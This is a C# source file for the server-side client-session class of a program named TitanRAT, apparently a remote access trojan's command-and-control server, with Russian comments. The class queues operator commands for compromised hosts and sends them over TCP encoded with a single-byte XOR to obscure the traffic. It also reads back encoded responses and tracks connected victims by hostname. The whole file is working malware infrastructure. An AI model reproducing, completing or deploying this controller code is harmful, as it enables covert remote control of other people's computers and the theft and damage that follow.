// Server/ClientSession.cs — v3: Robust Async I/O with Timeouts
using System.Net.Sockets;
using System.Text;
using System.Collections.Concurrent;

namespace TitanRAT.Server;

public class ClientSession
{
    public string Id { get; }
    public string Hostname { get; set; } = "Unknown";
    public DateTime LastSeen { get; set; } = DateTime.UtcNow;
    
    private readonly TcpClient _client;
    private readonly NetworkStream _stream;
    private const byte XOR_KEY = 0xAA;
    private const byte XOR_NEWLINE = 0x0A ^ XOR_KEY;
    
    private readonly ConcurrentQueue<string> _commandQueue = new();
    private readonly ConcurrentQueue<string> _responseHistory = new();
    private const int MAX_HISTORY = 200;
    
    public ClientSession(string id, TcpClient client)
    {
        Id = id;
        _client = client;
    
        // ← КРИТИЧНО: тайм-ауты для обнаружения обрыва
        _client.ReceiveTimeout = 15000;
        _client.SendTimeout = 15000;
    
        _stream = client.GetStream();
    }
    
    public void EnqueueCommand(string command) => _commandQueue.Enqueue(command);
    public string? GetPendingCommand() => _commandQueue.TryDequeue(out var cmd) ? cmd : null;
    
    public void AddResponse(string response)
    {
        _responseHistory.Enqueue(response);
        while (_responseHistory.Count > MAX_HISTORY) _responseHistory.TryDequeue(out _);
    }
    
    public IEnumerable<string> GetRecentResponses(int count = 20) => 
        _responseHistory.Reverse().Take(count);
    
    public void ClearQueue() { while (_commandQueue.TryDequeue(out _)) { } }
    public int QueueSize => _commandQueue.Count;
    
    // Вставь это в ClientSession.cs вместо старого метода SendCommandAsync
    public async Task SendCommandAsync(string command)
    {
        try
        {
            // ЛОГ СЕРВЕРА: Показываем команду ДО шифрования
            Console.WriteLine($"[SERVER TRACE] ⚡ Sending raw command: '{command.Trim()}'");
        
            var plaintext = command + "\n";
            var bytes = Encoding.UTF8.GetBytes(plaintext);
            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= XOR_KEY;
            await _stream.WriteAsync(bytes, 0, bytes.Length);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Error sending command: {ex.Message}");
        }
    }
    
    public async Task<string?> ReadLineAsync()
    {
        var buffer = new List<byte>(1024);
        var singleByte = new byte[1];
        
        try
        {
            while (true)
            {
                // ReadAsync вернёт 0 при аккуратном закрытии, или бросит исключение при обрыве
                int read = await _stream.ReadAsync(singleByte, 0, 1);
                
                if (read == 0) return null; // Graceful disconnect
                
                byte b = singleByte[0];
                if (b == XOR_NEWLINE)
                {
                    var bytes = buffer.ToArray();
                    for (int i = 0; i < bytes.Length; i++) bytes[i] ^= XOR_KEY;
                    return Encoding.UTF8.GetString(bytes);
                }
                buffer.Add(b);
                if (buffer.Count > 5 * 1024 * 1024) return null;
            }
        }
        catch (IOException) { return null; }          // TCP RST, тайм-аут, сеть упала
        catch (ObjectDisposedException) { return null; } // Сокет закрыт
        catch (SocketException) { return null; }       // Ошибка уровня сокета
        catch (OperationCanceledException) { return null; }
        catch { return null; }                         // Любой другой форс-мажор
    }
    
    public void Close()
    {
        try { _stream?.Dispose(); _client?.Close(); } catch { }
    }
}